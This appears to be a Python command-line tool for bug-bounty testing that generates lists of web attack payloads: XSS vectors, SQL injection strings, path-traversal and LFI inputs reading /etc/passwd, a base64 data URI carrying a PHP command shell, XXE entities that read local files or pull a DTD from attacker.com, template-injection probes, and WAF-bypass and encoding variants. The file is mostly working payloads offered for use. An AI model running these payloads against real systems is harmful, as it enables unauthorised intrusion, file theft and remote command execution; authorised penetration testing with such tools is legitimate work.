#!/usr/bin/env python3
"""
Payload Generator for Bug Bounty
Generates customized payload lists for various vulnerabilities
"""

import argparse
import base64
import urllib.parse
import random
import string

class PayloadGenerator:
    def __init__(self):
        self.xss_vectors = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=prompt(1)>",
            "<details open ontoggle=alert(1)>",
            "<select onfocus=alert(1) autofocus>",
        ]
        
        self.sqli_basic = [
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "1' OR '1'='1",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../../../windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
            "expect://id",
        ]
        
        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]>',
            '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><text>XXE</text></svg>',
        ]
        
        self.ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "{{7*'7'}}",
            "<%= 7*7 %>",
            "${7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
        ]
    
    def encode_payloads(self, payloads, encoding):
        """Apply different encodings to payloads"""
        encoded = []
        
        for payload in payloads:
            if encoding == 'url':
                encoded.append(urllib.parse.quote(payload))
            elif encoding == 'double_url':
                encoded.append(urllib.parse.quote(urllib.parse.quote(payload)))
            elif encoding == 'base64':
                encoded.append(base64.b64encode(payload.encode()).decode())
            elif encoding == 'hex':
                encoded.append('0x' + payload.encode().hex())
            else:
                encoded.append(payload)
        
        return encoded
    
    def generate_custom_wordlist(self, base_words, mutations=True):
        """Generate custom wordlist with mutations"""
        wordlist = set(base_words)
        
        if mutations:
            mutations_list = []
            
            for word in base_words:
                # Add numbers
                for i in range(10):
                    mutations_list.append(f"{word}{i}")
                    mutations_list.append(f"{word}_{i}")
                    mutations_list.append(f"{word}-{i}")
                
                # Case variations
                mutations_list.append(word.upper())
                mutations_list.append(word.lower())
                mutations_list.append(word.capitalize())
                
                # Common suffixes
                for suffix in ['dev', 'test', 'prod', 'staging', 'old', 'new', 'backup']:
                    mutations_list.append(f"{word}-{suffix}")
                    mutations_list.append(f"{word}_{suffix}")
                
                # Common prefixes
                for prefix in ['dev', 'test', 'prod', 'staging', 'api']:
                    mutations_list.append(f"{prefix}-{word}")
                    mutations_list.append(f"{prefix}_{word}")
            
            wordlist.update(mutations_list)
        
        return sorted(list(wordlist))
    
    def generate_intruder_list(self, payload_type, encoding=None, output_file=None):
        """Generate payload list for Burp Intruder"""
        payloads = []
        
        if payload_type == 'xss':
            payloads = self.xss_vectors
        elif payload_type == 'sqli':
            payloads = self.sqli_basic
        elif payload_type == 'lfi':
            payloads = self.lfi_payloads
        elif payload_type == 'xxe':
            payloads = self.xxe_payloads
        elif payload_type == 'ssti':
            payloads = self.ssti_payloads
        elif payload_type == 'all':
            payloads = (self.xss_vectors + self.sqli_basic + 
                       self.lfi_payloads + self.xxe_payloads + 
                       self.ssti_payloads)
        
        if encoding:
            payloads = self.encode_payloads(payloads, encoding)
        
        if output_file:
            with open(output_file, 'w') as f:
                for payload in payloads:
                    f.write(payload + '\n')
            print(f"[+] Saved {len(payloads)} payloads to {output_file}")
        
        return payloads
    
    def generate_bypass_payloads(self, original_payload):
        """Generate WAF bypass variations of a payload"""
        bypasses = []
        
        # Original
        bypasses.append(original_payload)
        
        # Case manipulation
        bypasses.append(original_payload.upper())
        bypasses.append(original_payload.lower())
        
        # Comment injection
        if 'SELECT' in original_payload.upper():
            bypasses.append(original_payload.replace('SELECT', 'SEL/**/ECT'))
            bypasses.append(original_payload.replace('SELECT', 'SELE/*comment*/CT'))
        
        # Whitespace variations
        if '<script>' in original_payload.lower():
            bypasses.append(original_payload.replace('<script>', '<script >'))
            bypasses.append(original_payload.replace('<script>', '<script%20>'))
            bypasses.append(original_payload.replace('<script>', '<ScRiPt>'))
        
        # Encoding
        bypasses.append(urllib.parse.quote(original_payload))
        
        return bypasses

def main():
    parser = argparse.ArgumentParser(description='Payload Generator for Bug Bounty')
    parser.add_argument('-t', '--type', 
                       choices=['xss', 'sqli', 'lfi', 'xxe', 'ssti', 'all'],
                       help='Type of payload to generate')
    parser.add_argument('-e', '--encode', 
                       choices=['url', 'double_url', 'base64', 'hex'],
                       help='Encode payloads')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('-b', '--bypass', help='Generate bypasses for a specific payload')
    parser.add_argument('-w', '--wordlist', nargs='+', help='Generate custom wordlist from base words')
    
    args = parser.parse_args()
    
    generator = PayloadGenerator()
    
    if args.bypass:
        print(f"[*] Generating bypasses for: {args.bypass}")
        bypasses = generator.generate_bypass_payloads(args.bypass)
        for i, payload in enumerate(bypasses, 1):
            print(f"{i}. {payload}")
    
    elif args.wordlist:
        print(f"[*] Generating wordlist from base words: {args.wordlist}")
        wordlist = generator.generate_custom_wordlist(args.wordlist)
        if args.output:
            with open(args.output, 'w') as f:
                for word in wordlist:
                    f.write(word + '\n')
            print(f"[+] Generated {len(wordlist)} words, saved to {args.output}")
    
    elif args.type:
        payloads = generator.generate_intruder_list(args.type, args.encode, args.output)
        if not args.output:
            print(f"\n[*] Generated {len(payloads)} {args.type} payloads:")
            for i, payload in enumerate(payloads[:10], 1):  # Show first 10
                print(f"{i}. {payload}")
            if len(payloads) > 10:
                print(f"... and {len(payloads) - 10} more")
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()

# Usage examples:
# python3 payload-generator.py -t xss -o xss_payloads.txt
# python3 payload-generator.py -t sqli -e url -o sqli_urlencoded.txt
# python3 payload-generator.py -b "<script>alert(1)</script>"
# python3 payload-generator.py -w admin api test dev -o custom_wordlist.txt
